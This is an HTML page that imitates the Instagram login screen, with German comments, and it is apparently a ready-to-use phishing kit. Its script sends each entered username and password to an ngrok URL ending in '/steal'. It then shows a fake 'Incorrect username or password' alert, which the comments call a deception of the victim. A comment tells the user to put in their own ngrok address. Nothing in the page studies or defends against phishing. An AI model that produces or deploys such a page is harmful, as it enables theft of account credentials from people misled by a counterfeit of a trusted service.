<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 350px;
            background: #fff;
            border: 1px solid #e6e6e6;
            border-radius: 1px;
            padding: 20px 40px;
            box-sizing: border-box;
        }
        .logo {
            font-family: 'Billabong', cursive; /* Ersatz f체rs echte Logo */
            font-size: 50px;
            text-align: center;
            color: #262626;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 9px 0 7px 8px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 7px;
            width: 100%;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:disabled {
            background: #b2dffc;
        }
        .footer {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="loginBtn" disabled>Log In</button>
        </form>
        <div class="footer">Forgot password?</div>
    </div>
    <script>
        const form = document.getElementById("loginForm");
        const username = document.getElementById("username");
        const password = document.getElementById("password");
        const btn = document.getElementById("loginBtn");

        // Button aktivieren, wenn Felder gef체llt
        form.addEventListener("input", () => {
            btn.disabled = !(username.value && password.value);
        });

        form.addEventListener("submit", function(e) {
            e.preventDefault();
            let user = username.value;
            let pass = password.value;
            fetch("https://abc123.ngrok.io/steal", { // Ersetze mit deiner Ngrok-URL
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username: user, password: pass })
            }).then(() => {
                alert("Incorrect username or password."); // T채uschung f체rs Opfer
                username.value = "";
                password.value = "";
                btn.disabled = true;
            });
        });
    </script>
</body>
</html>
